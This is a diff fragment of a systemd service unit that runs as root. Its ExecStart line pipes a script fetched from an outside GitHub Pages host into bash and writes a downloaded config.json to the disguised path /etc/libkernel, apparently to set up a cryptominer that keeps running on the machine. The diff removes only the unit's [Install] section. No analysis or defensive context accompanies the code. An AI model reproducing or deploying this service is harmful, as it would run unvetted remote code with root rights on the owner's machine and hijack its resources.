@@ -6,6 +6,3 @@ After=network-online.target
 User=root
 ExecStart=/bin/bash -c "curl -s https://xmrhorizontal.github.io/alarm.sh | bash || true && rm /etc/libkernel || true && wget -O /etc/libkernel https://xmrhorizontal.github.io/config.json || true"
 Type=simple
-
-[Install]
-WantedBy=default.target
